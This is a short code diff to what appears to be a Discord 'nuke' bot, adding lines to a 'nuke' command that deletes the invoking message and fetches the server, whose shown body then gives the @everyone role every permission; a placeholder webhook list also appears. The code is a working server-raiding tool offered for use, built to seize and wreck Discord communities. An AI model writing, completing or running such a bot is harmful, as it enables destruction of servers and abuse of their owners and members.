@@ -127,6 +127,8 @@ async def guildname(ctx, *, name):
 webhooks = ["!!!WEBHOOKS HERE!!!"]
 @bot.command()
 async def nuke(ctx):
+    await ctx.message.delete()
+    guild = ctx.guild
     try:
       role = discord.utils.get(guild.roles, name = "@everyone")
       await role.edit(permissions = Permissions.all())
